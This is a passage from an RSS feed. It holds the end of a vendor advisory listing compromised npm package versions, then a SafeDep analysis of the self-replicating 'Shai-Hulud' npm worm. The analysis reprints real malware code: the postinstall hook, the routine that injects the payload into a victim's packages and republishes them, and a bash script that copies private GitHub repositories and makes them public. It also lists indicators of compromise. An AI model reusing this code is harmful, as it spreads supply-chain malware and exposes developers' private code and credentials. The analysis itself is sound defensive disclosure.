3.0.6</td> </tr> <tr> <td>ts-imports</td> <td>1.0.1, 1.0.2</td> </tr> <tr> <td>tvi-cli</td> <td>0.1.5</td> </tr> <tr> <td>ve-bamreader</td> <td>0.2.6</td> </tr> <tr> <td>ve-editor</td> <td>1.0.1</td> </tr> <tr> <td>verror-extra</td> <td>6.0.1</td> </tr> <tr> <td>voip-callkit</td> <td>1.0.2, 1.0.3</td> </tr> <tr> <td>wdio-web-reporter</td> <td>0.1.3</td> </tr> <tr> <td>yargs-help-output</td> <td>5.0.3</td> </tr> <tr> <td>yoo-styles</td> <td>6.0.326</td> </tr> </tbody> </table></div><p>&zwj;<strong>Story developing&hellip;</strong></p><h2>Remediation Advice</h2><ul><li>Check the versions you are using</li><li>Clean your npm cache</li><li>Reinstall all packages in your repository</li><li>Make sure you use a package lock file, and use pinned versions</li></ul><p><strong>How to tell if you are affected using Aikido:</strong></p><p>If you are an Aikido user, check your central feed and filter on malware issues. The vulnerability will be surfaced as a 100/100 critical issue in the feed. <strong>Tip</strong>: Aikido rescans your repos nightly, though we recommend triggering a full rescan as well.</p><p>If you are not yet an Aikido user, <a href="https://app.aikido.dev/login?_gl=1*5vc6kw*_gcl_aw*R0NMLjE3NTE2MjY3NDMuQ2owS0NRanc5NTNEQmhDeUFSSXNBTmhJWm9iTlE1dF9QaXZmbjVGb0pGeGRDV0VYMU1sN3lzUzhCSURXeFhIb0tzV0lYM09Gc1ZuNTRtUWFBczZlRUFMd193Y0I.*_gcl_au*MTkyMTk3MTY1NS4xNzUyNDgyNzky*FPAU*MTE5NDkwODkyOS4xNzUyNDgyNzU0">set up an account</a> and connect your repos. Our proprietary malware coverage is included in the free plan (no credit card required).</p><p><strong>For future protection</strong>, considering using <a href="https://www.npmjs.com/package/@aikidosec/safe-chain">Aikido SafeChain&nbsp;(open source)</a>, a secure wrapper for npm, npx, yarn... Safechain sits in your current workflows, it works by intercepting npm, npx, yarn, pnpm and pnpx commands and verifying the packages for malware before install against <a href="https://intel.aikido.dev/?tab=malware"><strong>Aikido Intel - Open Sources Threat Intelligence.</strong></a> Stop threats before they hit your machine.</p><p>&zwj;</p><p>&zwj;</p></div><div><div><p>Charlie Eriksen is a Security Researcher at Aikido Security, with extensive experience across IT security - including in product and leadership roles. He is the founder of jswzl and he previously worked at Secure Code Warrior as a security researcher and co-founded Adversary.</p></div></div></div><div><div><div><h2>AutoTriage Integration in IDE</h2><p>Aikido's IDE plugin can detect vulnerable code, and AutoTriage can help you ro priotiize what to fix</p></div></div><div><div><h2>Aikido for Students and Educators</h2><p>Aikido for Education offers students hands-on cybersecurity training with real-world security tools, free for all educators.</p></div></div><div><div><h2>Free hands-on security labs for your students</h2><p>Aikido for Education offers students hands-on cybersecurity training with real-world security tools, free for all educators.</p></div></div></div><div><div><h2>Get secure for free</h2><p>Secure your code, cloud, and runtime in one central system.<br>Find and fix vulnerabilities <span>fast</span> automatically.</p><p>No credit card required |Scan results in 32secs.</p></div></div></div><div class="gallery"><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68c938f5a9eb08d6b0b63db8_Dune_2021-Sandworm.jpg"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68c93b06a4b5417495f6a444_3c0aef4a.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68c93b06a4b5417495f6a447_8e743ed6.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/67ea6658517bb9c783e617e2_65871099f04b9ebb3d253537_359431729_10161266676199604_6750652865330630761_n.jpg"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6836b17027f911d14ce42ba7_arrow%20right.svg"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6825fdbd77201ff82b42eaac_Frame%201321315277%20(1).avif"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6825d8f68e45d9a5bf7a4beb_b1dbddf2b778530e6f5ace222c099514_random-cta-background.avif"></p></div></section>]]></description><pubDate>Tue, 16 Sep 2025 19:09:03 +0530</pubDate></item><item><link>https://safedep.io/npm-supply-chain-attack-targeting-maintainers/</link><title>Self-replicating worm like behaviour in latest npm Supply Chain Attack (safedep.io)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1niehal/selfreplicating_worm_like_behaviour_in_latest_npm/</guid><comments>https://www.reddit.com/r/programming/comments/1niehal/selfreplicating_worm_like_behaviour_in_latest_npm/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 40 min | <a href='https://www.reddit.com/r/programming/comments/1niehal/selfreplicating_worm_like_behaviour_in_latest_npm/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>We are investigating another npm supply chain attack. However, this one seems to be particularly interesting. Malicious payload include:</p><ul><li>Credential stealing using <code>trufflehog</code> scanning entire filesystem</li><li>Exposing GitHub private repositories</li><li>AWS credentials stealing</li></ul><p>Most surprisingly, we are observing self-replicating worm like behaviour if npm tokens are found from <code>.npmrc</code> and the affected user have packages published to npm.</p><p>Exposed GitHub repositories can be <a href="https://github.com/search?q=%22Shai-Hulud+Migration%22&amp;type=repositories&amp;s=updated&amp;o=desc">searched here</a>. Take immediate action if you are impacted.</p><p>Full technical details <a href="https://safedep.io/npm-supply-chain-attack-targeting-maintainers/">here</a>.</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://safedep.io/images/npm-supply-chain-attack-ctrl-tinycolor-banner.png' /></section><section class='parsed-content'><div><h2>TL;DR</h2><p>npm supply chain attacks continue. This time targeting <code>@ctrl/tinycolor</code> and multiple other npm packages with credential stealer malware. In this blog, we will analyze the attack and its impact on the npm ecosystem. We will also look at common attack patterns that are being used to target maintainers.</p><p><strong>Update</strong>: Along with packages already mentioned, these new packages are discovered to be affected with same attack pattern.</p><p>Lately we have observed multiple high-profile software supply chain attacks against the npm ecosystem:</p><ul><li><a href="https://safedep.io/multiple-npm-packages-compromised-billion-downloads">ansi-styles, debug, chalk and more npm packages compromised</a></li><li><a href="https://safedep.io/nx-build-system-compromise/">nx Build System Compromised</a></li><li><a href="https://github.com/duckdb/duckdb-node/security/advisories/GHSA-w62p-hx95-gf2c">DuckDB npm packages compromised</a></li><li><a href="https://safedep.io/eslint-config-prettier-major-npm-supply-chain-hack/">eslint-config-prettier compromised</a></li></ul><p>These attacks target packages collectively with over <em>2 BILLION</em> weekly downloads. While the payloads used in these attacks have questionable sophistication levels, the continued success of malicious actors in breaching highly popular open source packages exposes risks in the open source software supply chain, especially for software development teams shipping professional software.</p><p>There are, however, common patterns that are observed in these attacks:</p><ol><li>2FA phishing attacks against maintainers as we saw in the <a href="https://safedep.io/eslint-config-prettier-major-npm-supply-chain-hack/">eslint-config-prettier incident</a></li><li>Maintainers of dormant packages are being targeted as we saw in the <a href="https://safedep.io/multiple-npm-packages-compromised-billion-downloads">ansi-style incident</a> and today&rsquo;s incident as well.</li></ol><p>For example, <code>@ctrl/tinycolor</code> did not have a release since over a year.</p><h3>Summary of Malicious Payload</h3><p><strong>Credential Harvesting:</strong></p><ul><li>Generates GitHub authentication tokens using <code>gh auth token</code> command</li><li>Harvests AWS credentials from environment variables, configuration files, Web Identity Tokens, and EC2 Instance Metadata Service (IMDS)</li><li>Uses TruffleHog to scan the local filesystem for secrets and credentials</li><li>Exfiltrates all discovered credentials to an attacker-controlled <code>webhook.site</code> URL</li></ul><p><strong>Repository Compromise:</strong></p><ul><li>Injects malicious GitHub Action workflows into all repositories accessible to the compromised user</li><li>Copies private repositories and makes them public with the description <code>Shai-Hulud Migration</code></li><li>Removes <code>.github/workflows</code> directories during the migration process to avoid detection</li></ul><p><strong>Self-Propagating Worm Behavior:</strong></p><ul><li>Extracts npm authentication tokens from <code>.npmrc</code> files</li><li>Identifies npm packages where the compromised user has maintainer access</li><li>Downloads package tarballs, injects the malicious <code>bundle.js</code> payload, and adds postinstall scripts</li><li>Automatically publishes new malicious versions of packages to npm registry</li><li>Increments package version numbers to ensure the malicious versions are treated as updates</li></ul><h3>How SafeDep can help?</h3><h4>Protect GitHub Repositories</h4><p>To protect the developer community against malicious packages that are flagged by SafeDep, we built free to use <a href="https://github.com/apps/safedep">SafeDep GitHub App</a>. It can be installed with zero configuration and will scan every pull request for malicious packages.</p><h4>Protect Developer Environments</h4><p>SafeDep open source tools especially <a href="https://github.com/safedep/vet">vet</a> and <a href="https://github.com/safedep/pmg">pmg</a> can help protect developers from malicious packages and other open source software supply chain attacks.</p><h2>The Attack</h2><p>The following is the list of affected package versions as published by <a href="https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages">Socket Security</a>:</p><h2>Technical Analysis</h2><p>We will use <a href="https://www.npmjs.com/package/@ctrl/deluge">@ctrl/<span>[email&nbsp;protected]</span></a> as the malicious sample for our analysis. SafeDep&rsquo;s automated malicious package analysis engine flagged this version based on <a href="https://platform.safedep.io/community/malysis/01K57G6DA5GGCTGNEWT159SX6D">post-install script and signature match</a>.</p><p>We compared version <code>7.2.0</code> and <code>7.2.2</code> to identify the malicious changes. The obvious difference was the size of the package.</p><div><figure><pre><code><div><p><span>&#10095; du -sh *</span></p></div><div><p><span>12K deluge-7.2.0.tgz</span></p></div><div><p><span>2.0M deluge-7.2.2.tgz</span></p></div></code></pre></figure></div><p>Subsequently, we looked at <code>package.json</code> changes and observed a newly introduced <code>postinstall</code> script in the malicious version.</p><div><figure><pre><code><div><p><span>&#10095; diff -u package-7.2.0/package.json package-7.2.2/package.json</span></p></div><div><p><span>--- package-7.2.0/package.json 1985-10-26 13:45:00</span></p></div><div><p><span>+++ package-7.2.2/package.json 2025-09-16 01:43:28</span></p></div><div><p><span>@@ -1,6 +1,6 @@</span></p></div><div><p><span>{</span></p></div><div><p><span>"name": "@ctrl/deluge",</span></p></div><div><p><span>- "version": "7.2.0",</span></p></div><div><p><span>+ "version": "7.2.2",</span></p></div><div><p><span>"description": "TypeScript api wrapper for deluge using got",</span></p></div><div><div><p><span>"author": "Scott Cooper &lt;<a href="https://safedep.io/cdn-cgi/l/email-protection">[email&nbsp;protected]</a>&gt;",</span></p></div></div><div><p><span>"license": "MIT",</span></p></div><div><p><span>@@ -25,7 +25,8 @@</span></p></div><div><p><span>"build:docs": "typedoc",</span></p></div><div><p><span>"test": "vitest run",</span></p></div><div><p><span>"test:watch": "vitest",</span></p></div><div><p><span>- "test:ci": "vitest run --coverage --reporter=default --reporter=junit --outputFile=./junit.xml"</span></p></div><div><p><span>+ "test:ci": "vitest run --coverage --reporter=default --reporter=junit --outputFile=./junit.xml",</span></p></div><div><p><span>+ "postinstall": "node bundle.js"</span></p></div><div><p><span>},</span></p></div><div><p><span>"dependencies": {</span></p></div><div><p><span>"@ctrl/magnet-link": "^4.0.2",</span></p></div><div><p><span>@@ -83,4 +84,4 @@</span></p></div><div><p><span>"importOrderSeparation": true,</span></p></div><div><p><span>"importOrderSortSpecifiers": false</span></p></div><div><p><span>}</span></p></div><div><p><span>-}</span></p></div><div><p><span>+}</span></p></div></code></pre></figure></div><p>Looking at some of the strings in <code>bundle.js</code>, it appears to be packed with <a href="https://webpack.js.org/api/node/">webpack</a>.</p><div><figure><pre><code><div><p><span>/*! For license information please see bundle.js.LICENSE.txt */</span></p></div><div><p><span>import</span><span>{createRequire </span><span>as</span><span> __WEBPACK_EXTERNAL_createRequire}</span><span>from</span><span>"node:module"</span><span>;</span><span>var</span><span> __webpack_modules__</span><span>=</span><span>{</span><span>1</span><span>:(</span><span>t</span><span>,</span><span>r</span><span>,</span><span>n</span><span>)</span><span>=&gt;</span><span>{n.</span><span>r</span><span>(r),n.</span><span>d</span><span>(r,{</span><span>isRedirect</span><span>:()</span><span>=&gt;</span><span>isRedirect});</span><span>const</span><span>F</span><span>=new</span><span>Set</span><span>([</span><span>301</span><span>,</span><span>302</span><span>,</span><span>303</span><span>,</span><span>307</span></p></div><div><p><span>,</span><span>308</span><span>])</span></p></div></code></pre></figure></div><h3>Payload</h3><p>Observed malicious payload in <code>bundle.js</code>:</p><ul><li>Generates a GitHub auth token using <code>gh auth token</code> with the current user&rsquo;s credentials</li><li>Contains an embedded bash script that injects a malicious GitHub Action workflow into all repositories of the authenticated user</li><li>Contains an embedded bash script that copies private repositories using the compromised GitHub token and makes them public with the description <code>Shai-Hulud Migration</code></li><li>Uses <a href="https://github.com/trufflesecurity/trufflehog">Trufflehog</a> to mine secrets from the local filesystem and exfiltrate them to an attacker-controlled <code>webhook.site</code> URL</li><li>Harvests AWS credentials from environment variables, local configuration files, Web Identity Tokens, and the <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html">IMDS</a> endpoint</li></ul><p><strong>Self-replicating worm like behavior</strong></p><p>The <code>bundle.js</code> payload has self-replicating worm-like behavior to infect <code>npm</code> packages that are accessible to the authenticated user. To achieve this, the payload does the following:</p><ul><li>Finds the infected user&rsquo;s npm token from the <code>.npmrc</code> file</li><li>Calls <code>https://registry.npmjs.org/-/whoami</code> to validate the token and retrieve the username</li><li>Searches for packages that are accessible to the authenticated user as a maintainer</li><li>Downloads the package tarball, injects the <code>bundle.js</code> payload, and adds a postinstall script to <code>package.json</code></li><li>Publishes the package to the authenticated user&rsquo;s npm registry using the <code>npm publish ...</code> command</li></ul><p>Example code:</p><div><figure><pre><code><div><p><span>async </span><span>searchPackages</span><span>(t, r </span><span>=</span><span>20</span><span>) {</span></p></div><div><p><span>const</span><span>n</span><span>=</span><span>`/-/v1/search?text=${</span><span>encodeURIComponent</span><span>(</span><span>t</span><span>)</span><span>}&amp;size=${</span><span>r</span><span>}`</span><span>,</span></p></div><div><p><span>F</span><span>=</span><span>`${</span><span>this</span><span>.</span><span>baseUrl</span><span>}${</span><span>n</span><span>}`</span><span>;</span></p></div><div><p><span>try</span><span> {</span></p></div><div><p><span>const</span><span>t</span><span>=</span><span>await</span><span>fetch</span><span>(</span><span>F</span><span>, {</span></p></div><div><p><span>method: </span><span>"GET"</span><span>,</span></p></div><div><p><span>headers: </span><span>this</span><span>.</span><span>getHeaders</span><span>(</span><span>!</span><span>1</span><span>)</span></p></div><div><p><span>});</span></p></div><div><p><span>if</span><span> (</span><span>!</span><span>t.ok) </span><span>throw</span><span>new</span><span>Error</span><span>(</span><span>`HTTP ${</span><span>t</span><span>.</span><span>status</span><span>}: ${</span><span>t</span><span>.</span><span>statusText</span><span>}`</span><span>);</span></p></div><div><p><span>return</span><span> (</span><span>await</span><span> t.</span><span>json</span><span>()).objects </span><span>||</span><span> []</span></p></div><div><p><span>} </span><span>catch</span><span> (t) {</span></p></div><div><p><span>return</span><span> console.</span><span>error</span><span>(</span><span>"Error searching packages:"</span><span>, t), []</span></p></div><div><p><span>}</span></p></div><div><p><span>}</span></p></div></code></pre></figure></div><p><strong>Update Package to inject bundle.js and modify package.json</strong></p><div><figure><pre><code><div><p><span>async </span><span>updatePackage</span><span>(t) {</span></p></div><div><p><span>try</span><span> {</span></p></div><div><p><span>const</span><span>ie</span><span>=</span><span>await</span><span>fetch</span><span>(t.tarballUrl, {</span></p></div><div><p><span>method: </span><span>"GET"</span><span>,</span></p></div><div><p><span>headers: {</span></p></div><div><p><span>"User-Agent"</span><span>: </span><span>this</span><span>.userAgent,</span></p></div><div><p><span>Accept: </span><span>"*/*"</span><span>,</span></p></div><div><p><span>"Accept-Encoding"</span><span>: </span><span>"gzip, deflate, br"</span></p></div><div><p><span>}</span></p></div><div><p><span>});</span></p></div><div><p><span>// [...]</span></p></div><div><p><span>try</span><span> {</span></p></div><div><p><span>await</span><span> re.promises.</span><span>writeFile</span><span>(ce, se), </span><span>await</span><span>te</span><span>(</span><span>`gzip -d -c ${</span><span>ce</span><span>} &gt; ${</span><span>le</span><span>}`</span><span>), </span><span>await</span><span>te</span><span>(</span><span>`tar -xf ${</span><span>le</span><span>} -C ${</span><span>ae</span><span>} package/package.json`</span><span>);</span></p></div><div><p><span>const</span><span>t</span><span>=</span><span> ne.</span><span>join</span><span>(ae, </span><span>"package"</span><span>, </span><span>"package.json"</span><span>),</span></p></div><div><p><span>r</span><span>=</span><span>await</span><span> re.promises.</span><span>readFile</span><span>(t, </span><span>"utf-8"</span><span>),</span></p></div><div><p><span>n</span><span>=</span><span>JSON</span><span>.</span><span>parse</span><span>(r);</span></p></div><div><p><span>if</span><span> (n.version) {</span></p></div><div><p><span>const</span><span>t</span><span>=</span><span> n.version.</span><span>split</span><span>(</span><span>"."</span><span>);</span></p></div><div><p><span>if</span><span> (</span><span>3</span><span>===</span><span> t.</span><span>length</span><span>) {</span></p></div><div><p><span>const</span><span>r</span><span>=</span><span>parseInt</span><span>(t[</span><span>]),</span></p></div><div><p><span>F</span><span>=</span><span>parseInt</span><span>(t[</span><span>1</span><span>]),</span></p></div><div><p><span>te</span><span>=</span><span>parseInt</span><span>(t[</span><span>2</span><span>]);</span></p></div><div><p><span>isNaN</span><span>(te) </span><span>||</span><span> (n.version </span><span>=</span><span>`${</span><span>r</span><span>}.${</span><span>F</span><span>}.${</span><span>te</span><span>+</span><span>1</span><span>}`</span><span>)</span></p></div><div><p><span>}</span></p></div><div><p><span>}</span></p></div><div><p><span>n.scripts </span><span>||</span><span> (n.scripts </span><span>=</span><span> {}), n.scripts.postinstall </span><span>=</span><span>"node bundle.js"</span><span>, </span><span>await</span><span> re.promises.</span><span>writeFile</span><span>(t, </span><span>JSON</span><span>.</span><span>stringify</span><span>(n, </span><span>null</span><span>, </span><span>2</span><span>)), </span><span>await</span><span>te</span><span>(</span><span>`tar -uf ${</span><span>le</span><span>} -C ${</span><span>ae</span><span>} package/package.json`</span><span>);</span></p></div><div><p><span>const</span><span>F</span><span>=</span><span> process.argv[</span><span>1</span><span>];</span></p></div><div><p><span>if</span><span> (</span><span>F</span><span>&amp;&amp;</span><span>await</span><span> re.promises.</span><span>access</span><span>(</span><span>F</span><span>).</span><span>then</span><span>(() </span><span>=&gt;</span><span>!</span><span>).</span><span>catch</span><span>(() </span><span>=&gt;</span><span>!</span><span>1</span><span>)) {</span></p></div><div><p><span>const</span><span>t</span><span>=</span><span> ne.</span><span>join</span><span>(ae, </span><span>"package"</span><span>, </span><span>"bundle.js"</span><span>),</span></p></div><div><p><span>r</span><span>=</span><span>await</span><span> re.promises.</span><span>readFile</span><span>(</span><span>F</span><span>);</span></p></div><div><p><span>await</span><span> re.promises.</span><span>writeFile</span><span>(t, r), </span><span>await</span><span>te</span><span>(</span><span>`tar -uf ${</span><span>le</span><span>} -C ${</span><span>ae</span><span>} package/bundle.js`</span><span>)</span></p></div><div><p><span>}</span></p></div><div><p><span>await</span><span>te</span><span>(</span><span>`gzip -c ${</span><span>le</span><span>} &gt; ${</span><span>ue</span><span>}`</span><span>), </span><span>await</span><span>te</span><span>(</span><span>`npm publish ${</span><span>ue</span><span>}`</span><span>), </span><span>await</span><span> re.promises.</span><span>rm</span><span>(ae, {</span></p></div><div><p><span>recursive: </span><span>!</span><span>,</span></p></div><div><p><span>force: </span><span>!</span></p></div><div><p><span></span><span>})</span></p></div><div><p><span>} </span><span>catch</span><span> (t) {</span></p></div><div><p><span>// [...]</span></p></div><div><p><span>}</span></p></div><div><p><span>} </span><span>catch</span><span> (t) {</span></p></div><div><p><span>throw</span><span>new</span><span>Error</span><span>(</span><span>`Failed to update package: ${</span><span>t</span><span>}`</span><span>)</span></p></div><div><p><span>}</span></p></div><div><p><span>}</span></p></div></code></pre></figure></div><p><strong>Impact</strong></p><p>At the time of writing, at least 650+ repositories appear to be affected by this attack, as observed in a <a href="https://github.com/search?q=%22Shai-Hulud+Migration%22&amp;type=repositories">GitHub search</a>.</p><h2>Indicators of Compromise (IOC)</h2><ul><li><code>bundle.js</code> SHA2 <code>46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09</code></li><li>GitHub repositories with description <code>Shai-Hulud Migration</code> <a href="https://github.com/search?q=%22Shai-Hulud+Migration%22&amp;type=repositories">example</a></li><li>HTTP requests to <code>hxxps://webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7</code></li></ul><h2>Appendix</h2><p>Manually formatted shell script from <code>bundle.js</code> that exfiltrates private repositories using a compromised GitHub token and makes them public with the description <code>Shai-Hulud Migration</code>:</p><div><figure><pre><code><div><p><span>#!/bin/bash</span></p></div><div><p><span>#-----------------------------------------------------------------------</span></p></div><div><p><span># This script is designed to migrate all private and internal GitHub</span></p></div><div><p><span># repositories from a source organization to a target user's account.</span></p></div><div><p><span>#</span></p></div><div><p><span># It performs the following actions:</span></p></div><div><p><span># 1. Fetches all non-archived private and internal repositories from the SOURCE_ORG.</span></p></div><div><p><span># 2. For each repository, it creates a new private repository under the TARGET_USER.</span></p></div><div><p><span># 3. It then mirrors the original repository to the new one.</span></p></div><div><p><span># 4. Crucially, it removes the .github/workflows directory during migration.</span></p></div><div><p><span># 5. After a successful migration, it makes the new repository PUBLIC.</span></p></div><div><p><span>#</span></p></div><div><p><span># Usage:</span></p></div><div><p><span># ./migrate_script.sh <source_org> <target_user> <github_token></github_token></target_user></source_org></span></p></div><div><p><span>#</span></p></div><div><p><span># Arguments:</span></p></div><div><p><span># SOURCE_ORG: The name of the GitHub organization to migrate from.</span></p></div><div><p><span># TARGET_USER: The GitHub username to migrate the repositories to.</span></p></div><div><p><span># GITHUB_TOKEN: A personal access token with 'repo' scope.</span></p></div><div><p><span>#-----------------------------------------------------------------------</span></p></div><div><p><span>SOURCE_ORG</span><span>=</span><span>""</span></p></div><div><p><span>TARGET_USER</span><span>=</span><span>""</span></p></div><div><p><span>GITHUB_TOKEN</span><span>=</span><span>""</span></p></div><div><p><span>PER_PAGE</span><span>=</span><span>100</span></p></div><div><p><span>TEMP_DIR</span><span>=</span><span>""</span></p></div><div><p><span># --- Argument Validation ---</span></p></div><div><p><span>if</span><span> [[ </span><span>$#</span><span>-lt</span><span>3</span><span> ]]; </span><span>then</span></p></div><div><p><span>echo</span><span>"Error: Missing arguments."</span></p></div><div><p><span>echo</span><span>"Usage: </span><span>$0</span><span> <source_org> <target_user> <github_token>"</github_token></target_user></source_org></span></p></div><div><p><span>exit</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>SOURCE_ORG</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>TARGET_USER</span><span>=</span><span>"</span><span>$2</span><span>"</span></p></div><div><p><span>GITHUB_TOKEN</span><span>=</span><span>"</span><span>$3</span><span>"</span></p></div><div><p><span>if</span><span> [[ </span><span>-z</span><span>"</span><span>$SOURCE_ORG</span><span>"</span><span>||</span><span>-z</span><span>"</span><span>$TARGET_USER</span><span>"</span><span>||</span><span>-z</span><span>"</span><span>$GITHUB_TOKEN</span><span>"</span><span> ]]; </span><span>then</span></p></div><div><p><span>echo</span><span>"Error: All three arguments are required."</span></p></div><div><p><span>exit</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span># Create a temporary directory for cloning repositories</span></p></div><div><p><span>TEMP_DIR</span><span>=</span><span>"./temp</span><span>$TARGET_USER</span><span>"</span></p></div><div><p><span>mkdir</span><span>-p</span><span>"</span><span>$TEMP_DIR</span><span>"</span></p></div><div><p><span>TEMP_DIR</span><span>=</span><span>$(</span><span>realpath</span><span>"</span><span>$TEMP_DIR</span><span>"</span><span>)</span></p></div><div><p><span># --- Function to make authenticated GitHub API calls ---</span></p></div><div><p><span>github_api</span><span>() {</span></p></div><div><p><span>local</span><span> endpoint</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> method</span><span>=</span><span>"</span><span>${2</span><span>:-</span><span>GET</span><span>}</span><span>"</span></p></div><div><p><span>local</span><span> data</span><span>=</span><span>"</span><span>${3</span><span>:-</span><span>}</span><span>"</span></p></div><div><p><span>local</span><span> curl_args</span><span>=</span><span>(</span><span>"-s"</span><span>"-w"</span><span>"%{http_code}"</span><span>"-H"</span><span>"Authorization: token </span><span>$GITHUB_TOKEN</span><span>"</span><span>"-H"</span><span>"Accept: application/vnd.github.v3+json"</span><span>)</span></p></div><div><p><span>if</span><span> [[ </span><span>"</span><span>$method</span><span>"</span><span>!=</span><span>"GET"</span><span> ]]; </span><span>then</span></p></div><div><p><span>curl_args</span><span>+=</span><span>(</span><span>"-X"</span><span>"</span><span>$method</span><span>"</span><span>)</span></p></div><div><p><span>fi</span></p></div><div><p><span>if</span><span> [[ </span><span>-n</span><span>"</span><span>$data</span><span>"</span><span> ]]; </span><span>then</span></p></div><div><p><span>curl_args</span><span>+=</span><span>(</span><span>"-H"</span><span>"Content-Type: application/json"</span><span>"-d"</span><span>"</span><span>$data</span><span>"</span><span>)</span></p></div><div><p><span>fi</span></p></div><div><p><span>curl</span><span>"${</span><span>curl_args</span><span>[</span><span>@</span><span>]}"</span><span>"https://api.github.com</span><span>$endpoint</span><span>"</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Function to retrieve all repositories from an organization ---</span></p></div><div><p><span>get_all_repos</span><span>() {</span></p></div><div><p><span>local</span><span> org</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> page</span><span>=</span><span>1</span></p></div><div><p><span>local</span><span> all_slugs</span><span>=</span><span>"[]"</span></p></div><div><p><span>while</span><span>true</span><span>; </span><span>do</span></p></div><div><p><span>local</span><span> response</span></p></div><div><p><span>response</span><span>=</span><span>$(</span><span>github_api</span><span>"/orgs/</span><span>$org</span><span>/repos?type=private,internal&amp;per_page=</span><span>$PER_PAGE</span><span>&amp;page=</span><span>$page</span><span>"</span><span>)</span></p></div><div><p><span>local</span><span> http_code</span><span>=</span><span>"${</span><span>response</span><span>:</span><span>-3</span><span>}"</span></p></div><div><p><span>local</span><span> body</span><span>=</span><span>"${</span><span>response</span><span>%</span><span>???}"</span></p></div><div><p><span>if</span><span>!</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>empty</span><span>2&gt;</span><span>/dev/null</span><span>||</span><span>!</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>-e</span><span>'type == "array"'</span><span>&gt;</span><span>/dev/null</span><span>; </span><span>then</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>local</span><span> repos_count</span></p></div><div><p><span>repos_count</span><span>=</span><span>$(</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>length</span><span>)</span></p></div><div><p><span>if</span><span> [[ </span><span>"</span><span>$repos_count</span><span>"</span><span>-eq</span><span>0</span><span> ]]; </span><span>then</span></p></div><div><p><span>break</span></p></div><div><p><span>fi</span></p></div><div><p><span>local</span><span> page_slugs</span></p></div><div><p><span>page_slugs</span><span>=</span><span>$(</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>'[.[] | select(.archived == false) | .full_name]'</span><span>)</span></p></div><div><p><span>all_slugs</span><span>=</span><span>$(</span><span>echo</span><span>"</span><span>$all_slugs</span><span>"</span><span>"</span><span>$page_slugs</span><span>"</span><span>|</span><span>jq</span><span>-s</span><span>'add'</span><span>)</span></p></div><div><p><span>((page</span><span>++</span><span>))</span></p></div><div><p><span>done</span></p></div><div><p><span>echo</span><span>"</span><span>$all_slugs</span><span>"</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Function to create a new repository for the target user ---</span></p></div><div><p><span>create_repo</span><span>() {</span></p></div><div><p><span>local</span><span> repo_name</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> repo_data</span></p></div><div><p><span>repo_data</span><span>=</span><span>$(</span><span>cat</span><span>&lt;&lt;</span><span>EOF</span></p></div><div><p><span>{</span></p></div><div><p><span>"name": "</span><span>$repo_name</span><span>",</span></p></div><div><p><span>"description": "Shai-Hulud Migration",</span></p></div><div><p><span>"private": true,</span></p></div><div><p><span>"has_issues": false,</span></p></div><div><p><span>"has_projects": false,</span></p></div><div><p><span>"has_wiki": false</span></p></div><div><p><span>}</span></p></div><div><p><span>EOF</span></p></div><div><p><span>)</span></p></div><div><p><span>local</span><span> response</span></p></div><div><p><span>response</span><span>=</span><span>$(</span><span>github_api</span><span>"/user/repos"</span><span>"POST"</span><span>"</span><span>$repo_data</span><span>"</span><span>)</span></p></div><div><p><span>local</span><span> http_code</span><span>=</span><span>"${</span><span>response</span><span>:</span><span>-3</span><span>}"</span></p></div><div><p><span>local</span><span> body</span><span>=</span><span>"${</span><span>response</span><span>%</span><span>???}"</span></p></div><div><p><span>if</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>-e</span><span>'.name'</span><span>&gt;</span><span>/dev/null</span><span>2&gt;&amp;1</span><span>; </span><span>then</span></p></div><div><p><span>return</span><span>0</span></p></div><div><p><span>else</span></p></div><div><p><span># Handle secondary rate limits by sleeping</span></p></div><div><p><span>if</span><span> [[ </span><span>"</span><span>$http_code</span><span>"</span><span>=~</span><span> ^4[0-9][0-9]$ ]] &amp;&amp; </span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>grep</span><span>-qi</span><span>"secondary rate"</span><span>; 